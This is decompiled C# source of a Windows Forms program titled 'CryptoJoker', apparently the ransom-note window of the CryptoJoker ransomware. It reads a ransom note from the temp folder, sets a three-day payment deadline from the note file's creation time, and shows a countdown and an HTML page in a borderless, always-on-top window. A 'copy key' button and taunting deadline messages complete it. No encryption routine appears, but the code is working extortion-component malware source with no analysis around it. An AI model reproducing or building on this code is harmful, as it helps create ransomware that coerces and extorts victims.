using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Simple_CountDown;

public class Form1 : Form
{
	public int hours;

	public int mins;

	public int secs;

	private IContainer components = null;

	private Label lblSec;

	private Label label10;

	private Label lblMin;

	private Label label8;

	private Label lblHr;

	private Timer timer1;

	private WebBrowser webBrowser1;

	private TextBox textBox1;

	private Button button1;

	public Form1()
	{
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d8: Expected O, but got Unknown
		string tempPath = Path.GetTempPath();
		string path = tempPath + "README!!!.txt";
		File.SetAttributes(path, FileAttributes.ReadOnly);
		DateTime creationTime = File.GetCreationTime(path);
		DateTime dateTime = default(DateTime);
		dateTime = creationTime.AddDays(3.0);
		DateTime now = DateTime.Now;
		TimeSpan timeSpan = dateTime - now;
		hours = (int)timeSpan.TotalHours;
		mins = (int)timeSpan.TotalMinutes;
		double num = (double)mins % 60.0;
		mins = (int)num;
		InitializeComponent();
		timer1.Start();
		string uriString = tempPath + "crjoker.html";
		webBrowser1.set_Url(new Uri(uriString));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).add_MouseDown(new MouseEventHandler(Form1_MouseDown));
	}

	public void button1_Click(object sender, EventArgs e)
	{
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		//IL_0063: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00b5: Unknown result type (might be due to invalid IL or missing references)
		string tempPath = Path.GetTempPath();
		string path = tempPath + "README!!!.txt";
		using (StreamReader streamReader = File.OpenText(path))
		{
			((Control)textBox1).set_Text(streamReader.ReadToEnd());
		}
		if (hours < 0 || mins < 0)
		{
			timer1.Stop();
			MessageBox.Show("Your have a chance. Just write me!");
			return;
		}
		if (hours == 0 && mins == 0 && secs == 0)
		{
			timer1.Stop();
			Form val = new Form();
			val.set_TopMost(true);
			MessageBox.Show((IWin32Window)(object)val, "This is Deadline!!!", "Will you press OK? :P", (MessageBoxButtons)0, (MessageBoxIcon)64);
			return;
		}
		if (secs < 1)
		{
			secs = 59;
			if (mins < 1)
			{
				mins = 59;
				if (hours != 0)
				{
					hours--;
				}
			}
			else
			{
				mins--;
			}
		}
		else
		{
			secs--;
		}
		if (hours > 9)
		{
			((Control)lblHr).set_Text(hours.ToString());
		}
		else
		{
			((Control)lblHr).set_Text("0" + hours);
		}
		if (mins > 9)
		{
			((Control)lblMin).set_Text(mins.ToString());
		}
		else
		{
			((Control)lblMin).set_Text("0" + mins);
		}
		if (secs > 9)
		{
			((Control)lblSec).set_Text(secs.ToString());
		}
		else
		{
			((Control)lblSec).set_Text("0" + secs);
		}
	}

	private void textBox1_TextChanged(object sender, EventArgs e)
	{
	}

	private void listView1_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void textBox1_TextChanged_1(object sender, EventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void textBox1_TextChanged_2(object sender, EventArgs e)
	{
	}

	private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
	}

	private void textBox1_TextChanged_3(object sender, EventArgs e)
	{
	}

	public void webBrowser1_DocumentCompleted_1(object sender, WebBrowserDocumentCompletedEventArgs e)
	{
	}

	private void lblSec_Click(object sender, EventArgs e)
	{
	}

	private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	private void textBox1_TextChanged_4(object sender, EventArgs e)
	{
	}

	private void button1_Click_1(object sender, EventArgs e)
	{
		string tempPath = Path.GetTempPath();
		string path = tempPath + "README!!!.txt";
		using StreamReader streamReader = File.OpenText(path);
		Clipboard.SetText(streamReader.ReadToEnd());
	}

	private void label3_Click(object sender, EventArgs e)
	{
	}

	private void label4_Click(object sender, EventArgs e)
	{
	}

	private void label5_Click(object sender, EventArgs e)
	{
	}

	private void Form1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).set_Capture(false);
		Message val = Message.Create(((Control)this).get_Handle(), 161, new IntPtr(2), IntPtr.Zero);
		((Control)this).WndProc(ref val);
	}

	private void label10_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Expected O, but got Unknown
		//IL_0134: Unknown result type (might be due to invalid IL or missing references)
		//IL_013e: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_0253: Unknown result type (might be due to invalid IL or missing references)
		//IL_025d: Expected O, but got Unknown
		//IL_02d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e1: Expected O, but got Unknown
		//IL_03db: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e5: Expected O, but got Unknown
		components = new Container();
		lblSec = new Label();
		label10 = new Label();
		lblMin = new Label();
		label8 = new Label();
		lblHr = new Label();
		timer1 = new Timer(components);
		webBrowser1 = new WebBrowser();
		textBox1 = new TextBox();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)lblSec).set_AutoSize(true);
		((Control)lblSec).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblSec).set_Location(new Point(374, 343));
		((Control)lblSec).set_Name("lblSec");
		((Control)lblSec).set_Size(new Size(49, 33));
		((Control)lblSec).set_TabIndex(16);
		((Control)lblSec).set_Text("00");
		((Control)lblSec).add_Click((EventHandler)lblSec_Click);
		((Control)label10).set_AutoSize(true);
		((Control)label10).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label10).set_Location(new Point(344, 343));
		((Control)label10).set_Name("label10");
		((Control)label10).set_Size(new Size(24, 33));
		((Control)label10).set_TabIndex(15);
		((Control)label10).set_Text(":");
		((Control)label10).add_Click((EventHandler)label10_Click);
		((Control)lblMin).set_AutoSize(true);
		((Control)lblMin).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblMin).set_Location(new Point(293, 343));
		((Control)lblMin).set_Name("lblMin");
		((Control)lblMin).set_Size(new Size(49, 33));
		((Control)lblMin).set_TabIndex(14);
		((Control)lblMin).set_Text("00");
		((Control)label8).set_AutoSize(true);
		((Control)label8).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label8).set_Location(new Point(263, 343));
		((Control)label8).set_Name("label8");
		((Control)label8).set_Size(new Size(24, 33));
		((Control)label8).set_TabIndex(13);
		((Control)label8).set_Text(":");
		((Control)lblHr).set_AutoSize(true);
		((Control)lblHr).set_Font(new Font("Microsoft Sans Serif", 21.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblHr).set_Location(new Point(217, 344));
		((Control)lblHr).set_Name("lblHr");
		((Control)lblHr).set_Size(new Size(49, 33));
		((Control)lblHr).set_TabIndex(12);
		((Control)lblHr).set_Text("00");
		timer1.set_Interval(1000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		webBrowser1.set_IsWebBrowserContextMenuEnabled(false);
		((Control)webBrowser1).set_Location(new Point(64, 39));
		((Control)webBrowser1).set_MinimumSize(new Size(20, 20));
		((Control)webBrowser1).set_Name("webBrowser1");
		((Control)webBrowser1).set_Size(new Size(525, 235));
		((Control)webBrowser1).set_TabIndex(18);
		webBrowser1.add_DocumentCompleted(new WebBrowserDocumentCompletedEventHandler(webBrowser1_DocumentCompleted_1));
		((Control)textBox1).set_Location(new Point(64, 294));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(525, 35));
		((Control)textBox1).set_TabIndex(19);
		((Control)textBox1).add_TextChanged((EventHandler)textBox1_TextChanged_4);
		((Control)button1).set_Location(new Point(438, 344));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(151, 32));
		((Control)button1).set_TabIndex(20);
		((Control)button1).set_Text("Копировать ключ");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click_1);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.DarkRed);
		((Form)this).set_ClientSize(new Size(654, 391));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)webBrowser1);
		((Control)this).get_Controls().Add((Control)(object)lblSec);
		((Control)this).get_Controls().Add((Control)(object)label10);
		((Control)this).get_Controls().Add((Control)(object)lblMin);
		((Control)this).get_Controls().Add((Control)(object)label8);
		((Control)this).get_Controls().Add((Control)(object)lblHr);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("CryptoJoker");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
